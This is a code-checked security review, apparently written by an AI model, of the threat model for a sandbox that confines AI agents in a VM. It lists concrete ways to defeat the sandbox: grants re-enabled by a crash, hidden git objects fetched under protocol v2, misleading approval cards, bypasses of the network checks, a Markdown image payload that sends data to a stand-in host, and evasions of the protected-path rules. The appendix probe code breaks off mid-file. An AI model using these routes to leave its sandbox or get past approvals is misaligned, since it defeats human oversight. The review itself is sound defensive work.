# Agent Sandbox threat model: review of 2026-11-21

A review of the threat model in [agent_sandbox.md](../agent_sandbox.md) and of
the claims the rest of that document makes, checked against the code at
commit `c0dab78` on `main`, by Claude Fable 5.2. No code and no other
document was changed for it.

## Summary

Most of what the document claims is what the code does. Six places are not:
the code contradicts a promise or a numbered guarantee. Two of the six were
reproduced by running the real modules.

| # | The document says                                                        | The code does                                                                                                      | Checked    |
| - | ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ | ---------- |
| 1 | Nothing the VM sends makes the sandbox fail (guarantee 16)               | One `mwt propose` crashes the sandbox server, and its restart turns back on the grants you turned off              | Proven     |
| 2 | A fetch never carries other refs or uncommitted work (guarantee 28)      | Under git's protocol v2 any object in your repository is served by id, a stash included                            | Proven     |
| 3 | An approval shows what will happen, with nothing hidden in it            | A request whose body arrives 2 s after its head gets a card saying "No body"                                       | Read       |
| 4 | Private ranges open only through a network grant that is on              | A host on a token grant's list is reached by name with no address check and no approval, with the Internet off too | Read       |
| 5 | Nothing leaves the VM except through MWT; MWT never connects to loopback | Markdown the VM wrote renders remote images, which your webview fetches from addresses the VM chose                | Reproduced |
| 6 | Nothing on this machine opens the VM's disks                             | `e2fsck` and `resize2fs` run here, as you, on images root in the VM wrote                                          | Read       |

The threat model itself leaves out part of the attack surface (the programs
on your machine that read what the VM wrote), some of what the VM holds by
default, and several ways out. [Gaps in the threat model](#gaps-in-the-threat-model)
lists them, and [Proposed changes](#proposed-changes) says what to do about
each.

## Method and coverage

- Six audits, one per area, each read the sections of the document and the
  modules for its area in full: the bubble and the VM; connections and DNS;
  intercepted requests; host commands and the agent channel; shared folders
  and handoffs; the firewall, MWT's tools and port forwarding. Each said,
  claim by claim, whether the code matches, with file and line. None
  changed the repository or ran its build or tests; two evaluated single
  functions and regular expressions in scripts of their own.
- The reviewer then read the code behind every finding in the two sections
  that follow this one, at the lines each cites.
- `mix test test/mwt_client/sandbox`, the suite the guarantees cite, gave
  884 tests and 82 doctests with 1 failure: a 60 s timeout in
  `disks_test.exs:95`, which reads and copies a 1 GiB image several times.
  That file passes when run alone.
- Two probe tests ran against the real modules, and three smaller checks
  ran outside them (plain git twice, the Markdown renderer once). Their
  sources are in the [appendix](#appendix-the-probes).

What each finding rests on:

| Label      | Meaning                                                                    |
| ---------- | -------------------------------------------------------------------------- |
| Proven     | A test ran against MWT's own modules and showed it                         |
| Reproduced | Shown outside MWT's full path: plain git, or one function called directly  |
| Read       | The code path was read by the reviewer; nothing was run                    |
| Reported   | An area audit read it; the reviewer did not read it again                  |

Not checked:

- The tests tagged `vm` did not run, so the parts of guarantees 6, 11, 12,
  13 and 29 that only a real VM shows were not checked.
- msb, libkrun, bwrap and Zed were not exercised. Where a finding depends on
  how one of them behaves, it says so.
- The Rust relay was read by one audit only.

## Where the code contradicts the document

### 1. A proposal from the VM crashes the server and resets grants

The document says that nothing the VM sends makes the sandbox fail
(guarantee 16), and that turning a grant off stops its next use.

`mwt propose commands` with `--dir` naming a folder inside a shared folder
crashes the server. `HostCommand.place/3` answers `{:share, real, share}`
for such a folder (`lib/mwt_client/sandbox/host_command.ex:235`), and
`Server.Approvals.place/3` matches two elements
(`lib/mwt_client/sandbox/server/approvals.ex:660`). The match fails inside
the server's `handle_call`. `docs/todo.md` already lists this as a bug.

What the todo list doesn't say is what the restart does. `Server.init/1`
puts every grant in the state its start setting names
(`lib/mwt_client/sandbox/server.ex:209`, `Grants.start/1`), after a crash
as after an unlock. The probe turned the Internet and `mwt-read` off, sent
the proposal, and read the grants again:

| Grant        | As MWT started | After you turn it off | After the crash |
| ------------ | -------------- | --------------------- | --------------- |
| `internet`   | on, auto       | off                   | on, auto        |
| `mwt-read`   | on, auto       | off                   | on, auto        |
| `mwt-create` | on, auto       | on, auto              | on, auto        |
| `commands`   | off            | off                   | off             |

The agent heard "MWT is locked", exit 4. No grant has to be on to propose,
and the `mwt` command sends the agent's current directory as `--dir` when
none is given, so an agent can do this by accident from a shared folder.

What it allows:

- Any grant whose start setting is *Enabled* comes back on after you turned
  it off, and one set to *Enabled, auto* gets its allowance back after you
  set it to ask. The Internet grant starts enabled, so it is one of them.
- The other way, a grant you turned on for a time goes off.
- An isolation is saved, and the restarted server comes back isolated
  (`server.ex:210`).
- Reported: the approvals waiting, held command output, minted values and
  the firewall's memory of what you declined are kept in the server's
  memory only (`server/state.ex:418-463`) and are lost, and commands
  running on your machine are killed (`server.ex:1709-1723`).

Proposed:

- Match both answers of `place/3`.
- Make a restart after a crash different from a start after an unlock:
  restore each grant's state from before the crash, or come back with every
  grant off, instead of starting from the start settings.
- Add a guarantee: *a restart of the sandbox never turns on what you turned
  off*, with a test that sends every channel command with hostile fields
  and checks the server is still the same process.

### 2. A fetch serves objects no branch or tag reaches

The document says a fetch carries "your committed branches and tags" and
"never configuration, hooks, other refs, ignored files or uncommitted work"
(guarantee 28).

`GitTransport` serves a temporary bare repository that holds the refs MWT
chose and borrows your repository's whole object store
(`lib/mwt_client/sandbox/git_transport.ex:161-165`). It sets the four
`uploadpack.allow*InWant` options to false (`:59-62`) and accepts
`version=2` as the protocol (`:101`). Those four options are only enforced
by protocol v0 and v1. Under v2, `git upload-pack` sends any object it has
when asked for it by id.

The probe stashed a file in the host repository, made a commit and reset
it away, cloned through the real transport, and asked for both ids:

| Protocol               | `git fetch origin <id>`                                    | The file's content in the clone |
| ---------------------- | ---------------------------------------------------------- | ------------------------------- |
| default                | refused: "Server does not allow request for unadvertised object" | not there                 |
| `GIT_PROTOCOL=version=2` | a packfile arrives                                       | readable                        |

Under v2 the fetch stalls after the pack has arrived, so the command has to
be stopped; the objects are in the clone by then. The existing test
(`test/mwt_client/sandbox/git_transport_test.exs:60`) asks for a hidden
commit with the default protocol only, which is why it passes.

The VM needs the object's id. A handoff gives it some. MWT's review store
borrows your repository's objects too
(`lib/mwt_client/sandbox/handoff_store.ex:35-39`), and when git fetches into
a repository that borrows another's objects, it offers the tips of that
other repository's refs as `have` lines. With plain git, the store laid out
as `HandoffStore.ensure/2` lays it out and the flags `HostGit` passes, the
fetch sent the id of `refs/stash` and of a remote-tracking branch to the
side it fetched from. In MWT that side is git in the VM. This part was
reproduced with plain git; it was not run through a VM.

What it allows: a VM that hands off once can learn the ids of your stash and
of your remote-tracking branches, then fetch their content. That includes
uncommitted work you stashed and colleagues' branches you fetched.

Proposed:

- Accept only v0 and v1 in `GitTransport.request/1`, and stop the helper
  from asking for v2.
- On the store's fetch, limit which of your refs git offers, with
  `core.alternateRefsPrefixes` set to `refs/heads/ refs/tags/`.
- Make the hidden-object test ask under `GIT_PROTOCOL=version=2` as well.

### 3. An approval card can say "No body" for a request that has one

The document says that "an approval shows what will happen, with
nothing hidden in it", and that a held request "shows in full".

Before it makes the card, MWT reads the body up to its declared length or
64 KiB. `read_at_least/4` stops at the first 2 s of silence and returns
what it has (`lib/mwt_client/sandbox/egress/connection.ex:714-721`). A
client that sends the head, waits, and then sends the body is read as
having an empty one. `RequestView.body/1` answers `{:none, ""}` for empty
data (`lib/mwt_client/sandbox/request_view.ex:103-104`), and the card
prints "No body"
(`lib/mwt_client_web/live/sandbox_live/approvals.ex:623-628`). The
`Content-Length` header is among the headers the card shows.

Once you allow it, the head goes out with the real value
(`connection.ex:486-505`) and the relay passes on whatever the client sends
next (reported at `connection.ex:790-795`). The
activity log keeps the body read before the decision, so it keeps none.

Reported, on the same path:

- Requests with the same head and different late bodies share the digest a
  waiting card is joined on, so one decision answers up to ten of them
  (`server/approvals.ex:50-54`, `approval.ex:314`).
- A GraphQL request read this way is titled "unknown", and its pattern
  holds a digest of the empty body. One *Allow similar* on it covers every
  later GraphQL request sent the same way (`describe.ex:247-264`).
- A body longer than 64 KiB has the same effect for whatever comes after
  the cut: padding before `"query"` gives "GraphQL unknown" and a pattern
  over the prefix. The only sign is the caption "first X of Y".

Proposed:

- Don't make a card until the declared body, up to 64 KiB, has arrived; a
  request that doesn't send it within the 10 s is refused. The client is
  waiting anyway.
- Stop forwarding at the declared length, or at the last chunk. That also
  closes the document's own *Not covered* entry on what the VM sends behind
  a request MWT read.
- A request MWT couldn't describe gets no *Allow similar*.
- Where a body is cut, say so among the facts, as a push already does.

### 4. Hosts on a token grant's list skip the network checks

The document says a private address opens "only when a network grant that
is on matches the address and port", and that the firewall leaves read
requests out of the upload rule because they "are judged one by one
already".

Four things in the code combine:

- A connection whose TLS name is on any token grant's list is read by MWT,
  the grant on or off, whatever address the VM asked for and with the
  Internet off (`lib/mwt_client/sandbox/gate.ex:556`, ahead of the
  Internet-off refusal at `:559`).
- A request with no placeholder passes: no approval, no look at the grant's
  state (`policy.ex:202`, `gate.ex:768-779`).
- MWT then connects to the host by name on port 443. `upstream/1` passes
  the name to `:ssl.connect` and has no call to `Destinations`, so the
  address the name resolves to isn't classified
  (`egress/connection.ex:557-576`).
- Uploads are counted only for tunnels: the one call to `Gate.upload/5` in
  `lib/` is in the tunnel's watch (`egress/connection.ex:997-1001`).

What it allows:

- If a token grant lists an internal name, the VM reaches that host
  without its network grant: it connects to any public address, names the
  host in the ClientHello, and MWT connects to the internal address for it.
  The network grant can be off; on this path its per-connection approval
  doesn't show and its way out isn't looked at. A name that resolves to
  loopback is reached the same way, against guarantee 2.
- With the Internet off, every host a token grant lists stays reachable
  for requests that carry no placeholder, including ones that carry a
  token MWT doesn't know. The document says these hosts are reached with
  the Internet off; it doesn't say that a list such as `*.googleapis.com`
  then includes storage any account can write to.
- A request body of any size to such a host is neither approved nor
  counted by the upload rule.

Proposed:

- Classify the address MWT resolved for a read host as for any connection:
  a private or reserved one needs the network grant, its approval and its
  way out.
- With the Internet off, a request with no placeholder to a token grant's
  host needs that grant on.
- Count request bodies to read hosts in the upload rule.

### 5. Markdown the VM wrote makes your webview fetch addresses it chose

The document says nothing leaves the VM except through MWT, and that MWT
never connects for the VM to loopback or this machine's own addresses
(guarantee 2).

`MWTClient.Markdown` renders with raw HTML off, which removes scripts and
empties links to scripts and local files (`lib/mwt_client/markdown.ex:20`).
Images stay. The renderer turned

```
![status](http://127.0.0.1:8080/admin?do=1) ![b](https://example.invalid/p.gif?d=c2VjcmV0)
```

into two `<img>` elements with those addresses. The page's only
Content-Security-Policy is Phoenix's default, `base-uri 'self';
frame-ancestors 'self'` (`lib/mwt_client_web/router.ex:11`), and the desktop
shell sets none (`src-tauri/tauri.conf.json`, `"csp": null`). Nothing stops
the webview from loading them. The webview itself wasn't run.

The VM writes Markdown that these pages render: a handoff's notes
(`lib/mwt_client_web/live/sandbox_live/handoffs.ex:332`), notes
(`notes_live.ex:894`) and flash cards (`flashcards_live/cards.ex:314`,
`remember.ex:284`), the last two through `mwt-create`, which is
auto-approved.

What it allows, when you open such a page:

- A GET from your machine to an address the VM chose: loopback, your LAN,
  a VPN host. It is blind, and limited to what a GET does.
- Data out in the address itself, to any host, outside the proxy, the
  activity log and the firewall. It works with the Internet off, and for
  pages made before an isolation.

Proposed:

- A Content-Security-Policy for every page, with `img-src 'self' data:` and
  `script-src 'self'`. It is also the second line of defence the pages lack
  if a text check is ever missed.
- Drop remote images when rendering, or show them as links.

### 6. Disk tools run here on images the VM wrote

The document says of the VM's disks: "Nothing on this machine opens them".
`Disks.reclaim!/1` runs `e2fsck -f -y -E discard` on an image
(`lib/mwt_client/sandbox/disks.ex:167`), and `grow!/2` runs `e2fsck -f -p`
and `resize2fs` (`:211-217`). Both run as you, with no bubble. Reported:
reclaiming is offered while the VM is stopped (`server/machine.ex:136-139`),
and growing happens at a start or a create when a disk's file is smaller
than its setting (`:227`, `:280`). Root in the VM writes those block devices
byte for byte, so both tools parse a file system the VM made. e2fsprogs has
had memory errors on crafted file systems (CVE-2019-5188, CVE-2022-1304).

Reported: a process that left the VM for the bubble can also shrink an
image file, which makes the next start grow it.

Proposed:

- Run both in a bubble like `msb-confined`'s: no home folder, no network,
  the one image bound.
- Or do the work in the VM: `fstrim` for reclaiming, an online
  `resize2fs` after the file grew.
- Change the sentence in the document either way.

## Smaller gaps

All read by the reviewer at the lines given.

| Area             | What                                                                                                                                                                                                                                                         | Where                                                         |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- |
| Proposed grants  | A proposal can carry `--mint`: a command the VM wrote, which runs as you, unconfined, with no approval per run once you accept the grant. Accepting sends only the grant's id, so a proposal changed between your reading and your click is accepted as changed. Guarantee 9's "you approve that exact text, each time" doesn't cover either. | `proposal.ex:79`, `server.ex:954-966`, `server/grants.ex:87-96` |
| Open in Zed      | A worktree's path is what the VM printed, and it is appended to `ssh://mwt-sandbox`. A path `@evil.example/x/slot-1` opens another host; the row shows `slot-1`. It needs your click. What Zed then does wasn't run.                                          | `zed.ex:58`, `slots.ex:384`, `sandbox_live/projects.ex:628`   |
| MWT's tools      | An `update_*` call that changes nothing skips the grant and returns the whole item: with all three grants off, while isolated, and without being counted by *Reading many notes*. It needs the item's id, which the VM keeps from earlier reads.                          | `mcp/tools.ex:99-102`, `:200`                                 |
| Handoffs         | The scan for real values answers "none" when it can't read what the handoff brings.                                                                                                                                                                          | `handoffs.ex:250-253`                                         |
| Shared folders   | A repository is a folder with a `.git` entry. A bare repository, or the target of `--separate-git-dir`, has none and is copied whole: its `config` with remote URLs, its `packed-refs`, its hooks.                                                           | `folder_sync.ex:828`                                          |
| DNS              | Answers go back as the resolver gave them. With the Internet on, the VM learns internal names and their private addresses from a split-horizon resolver. It can't connect to them without a grant.                                                           | `dns.ex:297-301`                                              |
| DNS              | The UDP answer is taken from whoever sends it: no check of the source, the id or the question. Such an answer also binds a network grant's name to an address.                                                                                               | `dns.ex:558-562`                                              |
| TLS name         | Only the first TLS record is parsed for the name. A ClientHello split over two records names nothing: the connection is tunnelled unread, past the rules keyed on the name and past a network grant's check of it. No value is at stake, since nothing is swapped in a tunnel. | `egress/connection.ex:1108-1116`, `gate.ex:588`               |
| Upload rule      | Uploads are counted under the domain of the name the VM gave. One address reached under several made-up names gets a 4 MiB window for each.                                                                                                                   | `firewall.ex:1292-1294`, `gate.ex:533`                        |
| Firewall off     | With the firewall's switch off, plaintext tunnels are not looked through for real values. The document says a real value in a tunnel "never goes, whatever the rule's action".                                                                              | `gate.ex:619`                                                 |
| Text that hides  | `Shown` flags controls and format characters. Variation selectors, combining marks, the Unicode spaces and blank letters such as U+3164 are in neither class.                                                                                              | `shown.ex:33`                                                 |
| Confined commands | The bubble has no seccomp filter and shares this machine's network, loopback included. The script is yours, so this is about a mistake in it, not about the VM.                                                                                           | `confine.ex:69-81`                                            |
| Seccomp          | On an architecture the filter isn't written for, the bubble starts with none.                                                                                                                                                                                | `bubble.ex:182`                                               |
| The bubble       | The document says what MWT trusts sits in `<id>-host/`. `control.sock`, `start.out` and `relay.lock` are in the folder the bubble writes, and MWT believes them for "stopped" and for how a start went, reading without a size limit. It matters only after an escape. | `bubble.ex:255`, `:335-337`, `:383-389`                       |
| Landing          | The fast-forward runs with `core.hooksPath=/dev/null`. Diffs are made with `--no-ext-diff` and without `--no-textconv`.                                                                                                                                      | `accept.ex:337`, `handoff.ex:440`                             |
| Upgrade          | A request with any `Upgrade` header keeps the client's `Connection` header and gets no `Connection: close`.                                                                                                                                                  | `egress/connection.ex:524-533`                                |
| Port forwarding  | The host a forward connects to inside the VM is the address the VM reported, when it isn't a loopback one.                                                                                                                                                   | `ports.ex:187-193`                                            |

Passages of the document that no longer describe the code:

- File grants, which the decision of 2026-11-18 removed and the code no
  longer has: the *file* row of the credentials table (line 1375), "Network,
  file" in the subgrants table (line 1425), "file name" in the Grants page's
  search (line 1750).
- "what was set aside" under Shared folders (line 543), from when copies
  were rescued.
- The 2026-11-16 row of Decisions (line 3144) describes syncing "every few
  seconds" and `/work/.rescued`, both replaced on 2026-11-18. The table is
  said to hold decisions in force.
- The trusted destinations have a fifth default the document doesn't list,
  `*.claude.com` (`firewall.ex:162`, reported).

## Reported by the area audits only

Each line is one audit's reading of the code. Treat them as leads.

### Connections and DNS

- A CONNECT with a host name is resolved by this machine's resolver before
  the view, an isolation or the Internet's state is looked at, and isn't
  logged (`egress/connection.ex:104-106`, `:1056-1066`). msb sends
  addresses; a process in the bubble could send a name.
- A ClientHello sent after 1.5 s of silence isn't parsed
  (`egress/connection.ex:259`).
- A DNS message cut after its name crashes the task that handles it, and
  the connection closes (`dns.ex`).
- Messages answered NOTIMP or REFUSED for their shape aren't logged
  (`dns.ex:277-284`), though guarantee 12 says every query is.
- A tunnel closed because its grant ended, or by an isolation, leaves no
  "Passed through" line and no last count of bytes
  (`egress/connection.ex:341-353`).
- A tunnel reports its bytes every 256 KiB, so many open tunnels can each
  send that much before the firewall counts any
  (`egress/connection.ex:969-980`).
- An anchored network grant that has to ask is always refused: the
  server's second decision drops the route (`server.ex:1284-1286`). It
  fails closed.
- An entry of a network grant without ports opens every port of that
  address (`destinations.ex:255`).

### Intercepted requests

- HTTP/1.0 is accepted and forwarded as 1.0, with `Transfer-Encoding:
  chunked` too (`egress/connection.ex:1076`).
- The method overrides refused are three exact header names
  (`egress/connection.ex:81`). `_method` in a query or a form body passes,
  and so does a name with underscores.
- `TRACE` and `CONNECT` are matched in capitals only.
- A value shorter than 8 bytes isn't looked for in the answer
  (`server/values.ex:18`).
- In a compressed answer, compressed bytes that decode to the start of the
  value can reach the VM before the cut
  (`egress/response.ex:245-246`, `:353-357`). This was not run.
- GraphQL is recognised for `POST /graphql` exactly (`describe.ex:65`).
  `/api/graphql`, a trailing slash and GET get the REST pattern, which
  covers any document.
- A card decodes Basic credentials only when the scheme is written "Basic"
  (`request_view.ex:380`); the swap takes any case.
- A minted value reaches the server as a plain message
  (`server.ex:1639`), so a crash while handling it would print it.

### Host commands and the agent channel

- The names a parameter may not take leave out `PYTHONPATH`,
  `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`, `HTTPS_PROXY` and `KUBECONFIG`
  (`param.ex:67-69`).
- A `word` takes `@/etc/passwd` and `file:/etc/passwd`. What that means
  depends on the tool that reads it.
- A `text` value `..` stays `..` in a request subgrant's path
  (`saved_request.ex:378`).
- A request subgrant's time limit is per chunk received, not for the whole
  request (`saved_request.ex:524`), and its send checks no address class.
- A confined command's folder is compared with your home as text. With a
  symlink in your home's path, the real home is bound into the bubble
  (`confine.ex:85`, `host_run.ex:219-224`).
- Output is looked through for credentials after it is cut to its first
  and last 32 KiB, so a value across a cut goes in part
  (`server/host_runs.ex:387`).
- A script padded with blank lines gets no hint: the hint for a long script
  counts the lines that aren't blank (`host_command.ex:291-295`), and the
  card scrolls (`sandbox_live/approvals.ex:1164-1167`).
- Auto-approved calls that are running aren't capped, only those waiting
  (`server/host_runs.ex:251-257`).
- A confined command gets the value of a token grant it names even while
  that grant's condition holds it off (`server/host_runs.ex:179-221`).
- A proposal doesn't count toward the ten activation asks, so twenty more
  cards can wait.

### Shared folders and handoffs

- A repository that appears in a shared folder is skipped from then on, but
  what was copied before stays in the VM
  (`folder_sync.ex:321-327`; `folder_sync_test.exs:154-163` asserts it).
- The credential folders refused as shares don't include `~/.claude`,
  `~/.codex`, `~/.cargo`, `~/.m2`, `~/.terraform.d`, `~/.config/op` or
  browser profiles (`shares.ex:32-45`).
- Process names from the VM reach the monitor's page and the firewall's
  incident text without `Shown` (`monitor/sample.ex:294`,
  `firewall.ex:1174`).
- The handoff fetch and the diff run git with your global configuration. A
  `textconv` you have configured would run on the VM's blobs when a diff is
  shown, and a filter such as git-lfs on the VM's files at a fast-forward.
- The diff is hidden until you ask for it, and a cut one says so in two
  faint lines inside it (`sandbox_live/handoffs.ex:1161-1169`). The
  decision panel says nothing.
- If counting the changed files fails, the page says 0 files
  (`handoff.ex:334`). At most 250 commits are listed.
- Symlinks, the executable bit and submodule links aren't flagged
  (`git/files.ex:383`). The path hints miss `.gitattributes`,
  `.gitmodules`, `.lfsconfig`, `.cargo/config.toml`, `AGENTS.md` and
  `config/*.exs` (`handoff.ex:146-154`).
- A commit's body, its author's email, its committer and its signature
  aren't shown (`handoff.ex:340`). A handoff landed as it is keeps the
  author, committer and dates the VM chose.
- The VM's objects enter your repository's object store at the click on
  Land, even when the landing is then refused
  (`handoff_store.ex:343-348`).
- The review store only grows: a revision's ref isn't deleted and no
  `git gc` runs. Each handoff is auto-approved and may bring 1 GiB.
- Past 100 handoff records the oldest go, open ones included
  (`server.ex:1205`).

### Firewall, MWT's tools, forwarding, agent threads

- A domain is the last two labels, or three for some two-letter top-level
  domains (`firewall.ex:1322-1341`); there is no public-suffix list. Names
  under a zone such as `ne.io` aren't judged by the DNS rule (`:1188`).
- The upload rule is passed by connections of 4 KiB or less (only 1,000
  flows are summed, `:1046`), by a server that sends back a quarter of what
  it got (`:1054`), and by filling the window with 10,000 keys, which
  empties it (`:1299-1303`).
- The protected paths are matched as text after quotes and backslashes are
  removed (`:1116-1118`). `tar c ~/.ssh`, `cat ~/.ssh/*`, a glob
  (`~/.s?h`) and a name built from a variable aren't caught; `.ssh`,
  `.aws`, `.kube` and `.docker` are listed by file names only.
- `sts.amazonaws.com` on the credential endpoints doesn't cover
  `sts.<region>.amazonaws.com` (`:615-622`).
- While isolated, the channel still answers `project`, `handoffs`,
  `worktree`, `attach`, `ports` and `why`. A request subgrant's call under
  way isn't stopped (`server/host_runs.ex:139-157`).
- The incident is saved last in an isolation, not first as the document
  orders it (`server/firewall.ex:175-211`).
- The hourly limit of `mwt-create` counts calls, and one call holds up to
  50 flash cards (`mcp/catalogue.ex:210`).
- An HTTP sample from the VM may point at loopback, a private address or a
  metadata address (`mcp/tools.ex:402-415`). The list shows it as "Saved
  sample", like yours, and Send runs it from this machine.
- What MWT's tools return says nothing of who made an item, so an agent on
  this machine reading through `/mcp` can't tell a note the VM wrote from
  yours (`mcp/tools.ex:437-448`).
- The forwarding address is derived from the identity's id with no check
  for two identities sharing one (`ports.ex:81-84`).
- The thread a handoff's note is sent to is the id the ask claimed, so a
  send-back can be said into another thread. The note MWT writes for a
  catch-up holds file names from the VM's commit, with no length limit
  (`handoffs.ex:826-850`).
- Any attached `mwt-acp` can take over an open thread's id and settle
  another's message (`agent_threads.ex:295-297`, `:321-327`).

### The bubble

- The bubble has a fresh `/proc`, `/dev/kvm`, and all of `/usr` read-only,
  `/usr/local` included (`bubble.ex:161-179`).
- The filter is a deny list of 55 calls on x86_64. `socket` and `ioctl`
  aren't filtered, and the confined msb keeps the terminal it was started
  from.
- Host file operations in the disks folder follow symlinks
  (`disks.ex:99`), so a process in the bubble could point `home.img`
  elsewhere before a snapshot or a reclaim.
- The AppArmor profile for the bubble adds no confinement
  (`scripts/deb/postinst.sh:58-70`); `docs/todo.md` has this.
- `msb load`, `ssh authorize` and the relay's own `msb create`, `start` and
  `stop` don't run under `timeout`.
- A VM with no record of its making counts as one from before 2026-11-16
  and gets the two mounts (`server/machine.ex:394-396`).

## Claims that matched the code

The audits found these as the document describes them.

| Area                 | Found as described                                                                                                                                                                                                                                                                              |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| The bubble           | The six `--unshare` flags, the binds, the environment of six variables, the relay as process 1, its dropped capabilities, its limits of 1024 and 256, `relay.lock`, the socket folder's mode, `<id>-host` never mounted, `create_args`, every `msb` on this machine through `msb-confined`, what the launcher turns away |
| Connections          | The 512 limit and the deadlines; every range that is always denied, with the IPv6 forms that carry an IPv4 address, checked by running `Destinations`; the Internet off; private ranges by a network grant's answered names; the 3 s answer; the 20 and 10 waiting                              |
| DNS                  | The query rebuilt from what was read; NOTIMP and REFUSED; REFUSED with the Internet off and while isolated; a grant's own resolver and way out                                                                                                                                                 |
| Intercepted requests | Each rule of the strict head; the placeholder rules and their codes; the mint, and the look at the grant after it; `Accept-Encoding: identity` and `Connection: close`; heads and trailers scrubbed and a body cut; the log copied before the swap                                           |
| Host commands        | Ask to run commands off and never auto-approved; the text on the card byte for byte what runs; the script's size limit; a script with hidden characters turned away; `cd -P` and exit 126; the parameter shapes; values only in the environment; the confined bubble's flags; request subgrants' URL, header and body rules; proposals saved off |
| Moving files         | Only placeholders in `/mnt/mwt`; symlinks not followed in a shared folder's copy; the picks that are turned away; the limits; the VM's memory joining yours only where ticked; landing by compare-and-swap; catching up in the store only                                                     |
| Firewall and tools   | Every default action and threshold of the rules table; a trusted name checked against MWT's own DNS answer; a credential endpoint turned away before the value is fetched; releasing; the three grants' defaults; HTTP requests closed to the VM; `/mcp` for local peers with the token; the `SameSite=Strict` cookie; ports 4100 to 4199 only, forwarded one way |

## Gaps in the threat model

### Attack surface

The model says the VM can "send any bytes to the three things MWT offers it:
the proxy, DNS and the agent channel". Programs on your machine also read
what the VM wrote:

| Program on your machine     | What it reads from the VM                                | Confined          |
| --------------------------- | -------------------------------------------------------- | ----------------- |
| `msb exec`, `msb ssh serve` | the guest agent's answers, the store                     | yes               |
| `e2fsck`, `resize2fs`       | the disks' file systems                                  | no                |
| `ssh`, for forwarding       | the VM's SSH server                                      | no                |
| `git`, in the review store  | packs, and blobs when a diff is shown, under your config | no                |
| `git upload-pack`           | the fetch protocol                                       | limits only       |
| Zed                         | its remote server in the VM                              | no                |
| Your browser                | pages of servers in the VM, at `127.77.X.Y`              | the browser's own |
| MWT's pages                 | text and Markdown the VM chose                           | `Shown`, no CSP   |
| MWT, from `msb exec`        | the monitor's sample, file lists, `git worktree list`    | size limits       |

### Credentials the VM does hold

Home holds the Claude and Codex logins, which *Where things live* says, and
Home's snapshots keep them on this machine. Anything you type into a VM
terminal is the VM's. The promise needs those words, and *Not covered* an
entry.

### Review of a handoff

*Not covered* says of landed code that "your review is the check", and the
decision of 2026-11-17 says a handoff's page is about landing "since you
reviewed the work in the VM". The diff Zed shows is what the VM's server
tells it. The only diff computed on this machine is the Handoffs page's,
hidden until asked for and cut at 2 MiB. The model should name that one as
the check, and the page should lead with it.

### Data in the VM by default

*Leaking what the VM has* names shared folders and clones. It also holds:

- every note, diagram and flash card of the identity, since `mwt-read`
  starts enabled and auto-approved;
- a copy of your OptMem, when the VM was started from yours;
- `host.md`: your user name, home path, tools and versions;
- whatever came back through a grant: an API's answers, a command's
  output.

### Ways out through your own programs

A page of a VM server, opened in your browser, runs there with your
browser's reach: it can call any host and any service on your loopback. Zed
and MWT's own Markdown pages are two more such programs. "Nothing leaves
the VM except through MWT" holds for the VM's own connections. It doesn't
hold for what you open on this machine.

### Items the VM writes that agents here read

The OptMem sync is manual because "your agents act on their memory, so a
planted note would be a way out of the VM". Notes and flash cards have the
same reader: agents on this machine read them through `/mcp`. `mwt-create`
is auto-approved and nothing marks an item as the VM's.

### Standing access at a service

*Minting a credential* refuses a request whose answer is a credential. A
request that gives someone else access returns none: a deploy key added, a
collaborator invited, an IAM binding, a webhook, a CI workflow changed.
Under an allowance, a token grant allows all of these.

### Restarts

No promise says what a restart may change. Finding 1 shows the model needs
one.

### Assumptions

The model assumes these without saying so:

- this machine's disk is encrypted: the VM's disks, Home's snapshots and
  the review store are plaintext;
- you are its only user;
- its architecture is one the seccomp filter is written for;
- its resolver answers honestly;
- your global git configuration is safe to run on files the VM wrote.

### Approvals

With the rest in place, what remains for an agent following planted
instructions is to ask well. The model says what you approve isn't defended.
It could say what helps: a first use of a destination marked as one, and a
pause when cards come faster than they can be read.

## Proposed changes

### Fixes

In the order the findings suggest:

1. Findings 1 to 6, each as proposed under it.
2. Bind *Accept* of a proposed grant to a digest of what its page showed,
   and show a proposed mint command as a script, with the hints a command's
   card has.
3. Check a folder before it goes into Zed's address: an absolute path under
   `/work`, of plain characters.
4. Send an `update_*` call that changes nothing through the read grant.
5. Make the handoff's scan for real values refuse when it can't read.
6. Treat a bare repository in a shared folder as a repository.
7. Answer REFUSED for a name no grant lists whose answer holds a private or
   reserved address, and check a UDP answer's source, id and question.
8. Run git on the VM's objects with `GIT_CONFIG_GLOBAL=/dev/null`, and
   diffs with `--no-textconv`.
9. Say who made an item in what MWT's tools return, and mark an HTTP sample
   the VM saved until you have opened it.
10. On a handoff's page: the diff shown before the decision, a cut said in
    the decision panel, and flags for symlinks, the executable bit and
    files that run by themselves.

### Additions to the document

- In the threat model: the table of programs above, as the attack surface;
  a list of what the VM holds; the exceptions to "The VM never holds a
  credential"; a line per assumption.
- In the promises table: a column naming the guarantees and tests that
  keep each one. The section says each promise is a numbered line; the table doesn't
  give the numbers.
- Under *Not covered*: the agents' own logins; pages of the VM you open in your
  browser; remote images, until finding 5 is fixed; what the VM writes for
  agents on your machine; standing access given at a service; the upload
  rule keyed on a name the VM chooses.
- New guarantees:
  - a restart of the sandbox never turns on what you turned off;
  - a card is made only from a request whose declared body, up to the
    limit, was read;
  - a fetch serves only objects your branches and tags reach, under every
    protocol version;
  - MWT connects to a read host only at an address the VM could have been
    let through to;
  - MWT's pages load nothing from an address the VM chose.
- Guarantees to reword: 9, for proposed scripts and mint commands; 12,
  for messages refused by shape; 13, for a VM made before 2026-11-16; 22,
  for requests without a placeholder.
- A test for each *Not covered* entry that shows the limit as it is, so a
  change that moves it is noticed.

## Appendix: the probes

The two tests go in `test/mwt_client/sandbox/` and run with
`mix test <file>`. Both pass while the gap is there; they print what they
found.

### Finding 1: the crash and the grant states

```elixir
defmodule MWTClient.Sandbox.ZzCrashProbeTest do
  use ExUnit.Case, async: true

  import ExUnit.CaptureLog

  alias MWTClient.Sandbox
  alias MWTClient.Sandbox.{Channel, Server}
  alias MWTClient.Vault.Store

  @cli Path.expand("../../../priv/sandbox/mwt-cli", __DIR__)

  @fake_socat """
  #!/usr/bin/env python3
  import socket, sys
  address = sys.argv[-1]
  data = sys.stdin.buffer.read()
  s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
